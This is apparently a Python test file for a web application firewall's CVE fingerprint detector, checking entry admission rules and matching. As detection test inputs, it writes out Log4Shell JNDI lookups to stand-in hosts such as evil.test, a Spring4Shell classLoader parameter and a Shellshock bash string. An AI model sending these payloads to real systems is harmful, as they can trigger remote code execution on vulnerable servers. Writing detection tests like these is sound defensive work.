"""Tests for Layer 4 — the curated CVE fingerprint set.

A match here returns ``Malicious`` on its own, the only single-source verdict in
the module (``docs/waf_payload_analyzer.md`` D10). That exception is only
defensible while every pattern is impossible in ordinary traffic, so most of
these tests guard the **admission bar** rather than the matching: a loose entry
does not just cause one false positive, it invalidates the exception for every
other entry in the file.
"""
from __future__ import annotations

import json
import re
import unittest
from pathlib import Path

from core import cve_fingerprint as cf

DATA_FILE = Path(__file__).resolve().parents[1] / "core" / "data" / "cve_fingerprints.json"


def _load() -> dict:
    return json.loads(DATA_FILE.read_text(encoding="utf-8"))


class TestAdmissionBar(unittest.TestCase):
    def test_every_entry_justifies_itself(self) -> None:
        # why_specific is the only record of why this layer may skip
        # corroboration. An entry without one cannot be audited later.
        for entry in _load()["fingerprints"]:
            with self.subTest(cve=entry["cve"]):
                self.assertTrue(entry.get("why_specific"))
                self.assertGreater(len(entry["why_specific"]), 60)

    def test_an_unjustified_entry_is_refused_at_load_time(self) -> None:
        # Not merely documented — enforced. load_fingerprints drops an entry
        # with no justification rather than trusting the file.
        loaded = {f["cve"] for f in cf.load_fingerprints()}
        declared = {f["cve"] for f in _load()["fingerprints"] if f.get("why_specific")}
        self.assertEqual(loaded, declared)

    def test_every_entry_has_a_reference(self) -> None:
        for entry in _load()["fingerprints"]:
            with self.subTest(cve=entry["cve"]):
                self.assertIn(entry["cve"], entry["reference"])

    def test_cve_ids_are_well_formed_and_unique(self) -> None:
        ids = [f["cve"] for f in _load()["fingerprints"]]
        self.assertEqual(len(ids), len(set(ids)))
        for cve in ids:
            with self.subTest(cve=cve):
                self.assertRegex(cve, r"^CVE-\d{4}-\d{4,}$")

    def test_every_pattern_compiles(self) -> None:
        for entry in _load()["fingerprints"]:
            with self.subTest(cve=entry["cve"]):
                re.compile(entry["pattern"])

    def test_rejected_candidates_are_recorded_with_reasons(self) -> None:
        # The file keeps what was turned away and why. The briefing's own
        # ProxyShell pattern, /owa/auth/.*\.js, matches ordinary Outlook Web
        # Access traffic; keeping that decision visible is what stops it being
        # rediscovered and re-added.
        rejected = _load()["_meta"]["rejected"]
        self.assertTrue(rejected)
        for item in rejected:
            with self.subTest(candidate=item["candidate"]):
                self.assertTrue(item["reason"])
                self.assertGreater(len(item["reason"]), 60)

    def test_the_set_stays_small(self) -> None:
        # Briefing §10: deliberately small at launch, grown from what is
        # actually seen. A large set here is a symptom, not an achievement.
        self.assertLessEqual(len(_load()["fingerprints"]), 15)


class TestMatching(unittest.TestCase):
    def test_log4shell(self) -> None:
        found = cf.match("${jndi:ldap://198.51.100.7:389/a}")
        self.assertIsNotNone(found)
        self.assertEqual(found.cve, "CVE-2021-44228")

    def test_spring4shell(self) -> None:
        payload = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=x"
        self.assertEqual(cf.match(payload).cve, "CVE-2022-22965")

    def test_shellshock(self) -> None:
        self.assertEqual(cf.match("() { :; }; /bin/bash -c id").cve, "CVE-2014-6271")

    def test_match_reports_where_it_fired(self) -> None:
        raw = "%24%7Bjndi%3Aldap%3A%2F%2Fevil.test%2Fa%7D"
        decoded = "${jndi:ldap://evil.test/a}"
        found = cf.match(raw, decoded)
        self.assertIsNotNone(found)
        self.assertEqual(found.matched_on, "decoded")

    def test_match_carries_its_justification(self) -> None:
        # The claim being made is strong enough that the reason travels with it,
        # into the flag detail and the narrative.
        found = cf.match("${jndi:rmi://evil.test/a}")
        self.assertIn("JNDI", found.why_specific)

    def test_no_match_on_ordinary_text(self) -> None:
        for payload in (
            "SELECT * FROM menu",
            "https://example.com/article?id=42",
            "price is ${total} before tax",
            "/owa/auth/logon.aspx",
            "/owa/auth/15.2.1/scripts/boot.js",
            "class=btn module=auth",
            "",
        ):
            with self.subTest(payload=payload):
                self.assertIsNone(cf.match(payload))

    def test_the_briefings_rejected_owa_pattern_stays_rejected(self) -> None:
        # Regression for the specific candidate the briefing proposed. If this
        # ever matches, every Exchange user's browser is a confirmed exploit.
        self.assertIsNone(cf.match("/owa/auth/15.2.1/scripts/boot.js"))

    def test_oversized_payload_does_not_stall(self) -> None:
        self.assertIsNone(cf.match("a" * (cf.MAX_SCAN_LEN + 1000)))


if __name__ == "__main__":
    unittest.main()
